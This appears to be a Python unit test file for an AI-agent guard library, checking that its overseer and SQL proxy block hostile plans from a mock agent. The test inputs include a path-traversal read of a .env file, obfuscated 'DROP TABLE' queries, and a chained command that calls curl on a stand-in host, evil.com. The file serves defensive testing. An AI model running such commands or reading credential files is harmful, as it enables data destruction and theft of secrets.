import unittest
import os
import sys

# Ensure library is in path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from sentinel_guard import Sentinel

class TestSentinelHardMode(unittest.TestCase):
    
    def setUp(self):
        self.sentinel = Sentinel()

    def test_path_traversal_attack(self):
        """Test obfuscated path traversal to access sensitive files."""
        # Trying to go up directories to find .env implies malicious intent
        plan = {
            "id": "attack-traversal",
            "agent": "HackerBot",
            "role": "admin",
            "steps": [{"tool": "read_file", "args": {"path": "../../.env"}}]
        }
        allowed, reason = self.sentinel.overseer.review_plan(plan)
        self.assertFalse(allowed, "Path traversal should be blocked")
        self.assertIn("sensitive file", reason)

    def test_sql_case_obfuscation(self):
        """Test Mixed cAsE SQl keywords."""
        # Attackers use mixed case to bypass simple string matching
        query = "dRoP TaBlE users"
        allowed, reason = self.sentinel.sql_proxy.intercept_query(query)
        self.assertFalse(allowed, "Mixed case DROP TABLE should be blocked")
        self.assertIn("Forbidden keyword", reason)

    def test_sql_whitespace_obfuscation(self):
        """Test extra whitespace in SQL injection."""
        # Attackers add spaces to break simple tokenizers
        query = "DROP    TABLE      users"
        allowed, reason = self.sentinel.sql_proxy.intercept_query(query)
        self.assertFalse(allowed, "DROP TABLE with extra spaces should be blocked")

    def test_chained_command_injection(self):
        """Test detecting prohibited commands in chained execution."""
        # Attackers use && or ; to hide commands
        plan = {
            "id": "attack-chain",
            "agent": "HackerBot",
            "role": "admin",
            "steps": [{"tool": "run_command", "args": {"command": "echo hello && curl evil.com"}}]
        }
        # Assuming 'curl' is prohibited or suspicious domains are checked
        # In policy.json we likely have "curl" or "wget" in prohibited_commands
        allowed, reason = self.sentinel.overseer.review_plan(plan)
        # Verify if our default policy catches this. If not, this test might fail (which is good info).
        # Let's check logic: prohibited_commands search using `in`. "curl" in "echo hello && curl..." is True.
        self.assertFalse(allowed, "Chained command with prohibited tool should be blocked")

if __name__ == '__main__':
    unittest.main()
